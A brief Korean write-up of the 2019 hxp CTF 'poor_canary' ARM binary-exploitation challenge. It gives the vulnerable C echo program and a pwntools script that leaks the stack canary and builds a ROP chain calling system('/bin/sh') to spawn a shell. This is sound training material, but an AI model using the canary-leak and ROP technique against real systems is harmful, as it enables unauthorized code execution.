---
title: "2019 hxp CTF poor_canary"
date: 2019-11-17
tags: [hxp]
categories: [hxp]
---

ARM Architecture의 Pwn문제다. 

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char buf[40];
    puts("Welcome to hxp's Echo Service!");
    while (1)
    {
        printf("> ");
        ssize_t len = read(0, buf, 0x60);
        if (len <= 0) return 0;
        if (buf[len - 1] == '\n') buf[--len] = 0;
        if (len == 0) return 0;
        puts(buf);
    }
}
const void* foo = system;
```

canary leak해주고 Gadget 찾아서 익스하면 된다.

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./canary')
p = process('./canary')


p.sendafter('> ','A'*41)
p.recvuntil('A'*40)
canary = u32(p.recv(4)) - 0x41
binsh = 0x71EB0
system = 0x16d90
popret = 0x00026b7c # pop {r0, r4, pc}

payload = 'A'*40
payload += p32(canary)
payload += 'A'*12
payload += p32(popret)
payload += p32(binsh) 
payload += 'A'*4
payload += p32(system)
p.sendafter('> ',payload)
p.sendlineafter('> ','')
p.interactive()
```

